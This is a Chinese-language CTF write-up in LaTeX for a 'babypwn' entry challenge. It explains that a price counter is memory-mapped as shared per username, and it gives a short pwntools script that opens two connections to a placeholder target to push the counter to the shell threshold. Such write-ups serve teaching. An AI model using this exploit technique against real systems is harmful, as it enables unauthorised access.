\chapter{pwn}
\section{乙组基准-babypwn}
NeSE乙组的基准题,高级网络攻防课说做出来这些题才可以选这门课。这一系列题目因为不是公开平台上的,所以就不放出来了。

这道题进去首先要输入一个name,有三个选项:
\begin{itemize}
    \item 1 提高price: 最多提高十次,到100。
    \item 2 显示price:始终是0。
    \item 3 获得flag:price到100也换不到,提示price太低。
\end{itemize}

用ida逆一下,发现price到达200就可以拿到shell,且price是char*,被mmap到了'/tmp/input\_name.acc':
\begin{lstlisting}
rice = mmap(0LL, 8uLL, 3, 1, fd, 0LL);          // PROT_WRITE | PROT_READ
                                                // MAP_SHARED
\end{lstlisting}
各个参数的含义可以用\href{https://github.com/zTrix/magic}{magic}查看。发现是共享映射的,那么直接开两个进程,输入一样的名字,分别提高10次price就可以拿到flag了。
\begin{lstlisting}
from pwn import *
context.log_level = "debug"
io_0 = remote("TARGET_ADDR", PORT)
io_0.sendafter("name.\n", b"a")
io_1 = remote("TARGET_ADDR", PORT)
io_1.sendafter("name.\n", b"a")
for i in range(11):
    io_0.sendlineafter("getflag\n", "1")
    io_1.sendlineafter("getflag\n", "1")
io_0.close()
io_1.interactive()
\end{lstlisting}
